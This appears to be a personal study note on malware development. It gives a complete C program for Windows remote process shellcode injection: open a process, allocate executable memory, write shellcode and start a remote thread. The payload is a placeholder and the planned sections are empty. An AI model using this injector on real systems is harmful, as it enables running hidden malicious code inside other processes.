reference: [crow's gitbook](https://crows-nest.gitbook.io/crows-nest/malware-development/process-injection/shellcode-injection)

# The words bit
Instead of basically copying crow's blog I'm going to add a few things.
1. Automate the whole "find notepad.exe PID and then start the program" thing.
2. Inject into the current program.
3. Load the shellcode from a file.

# Remote Process Injection
I think remote is the write word.
```c
#include <Windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

unsigned char whatsshellcode[] =
<shellcode>;

int main(int argc, char* argv[]) {

	if (argc < 2) {

		printf("%s usage: program.exe <PID>", e);
		return EXIT_FAILURE;
	}
	printf("%s\n", whatsshellcode);
	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process (%ld)\n", i, PID);

	/* open a handle to the process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {
		printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process!\n--0x%p\n", k, hProcess);


	/* allocate bytes to process memory */
	rBuffer = VirtualAllocEx(hProcess,NULL,sizeof(whatsshellcode),(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(whatsshellcode));

	WriteProcessMemory(hProcess, rBuffer, whatsshellcode, sizeof(whatsshellcode), NULL);
	printf("%s wrote %zu-bytes to process in memory.\n", k, sizeof(whatsshellcode));

	/* create thread to run the payload */
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld)\n--0x%p\n", k, TID, hThread);
	
	printf("%s waiting for thread to finish\n", i);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing\n",k);

	printf("%s cleaning up\n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s finished!", k);

	return EXIT_SUCCESS;
}
```

# Changes
## Automation
## Inject into current program
## Load from file
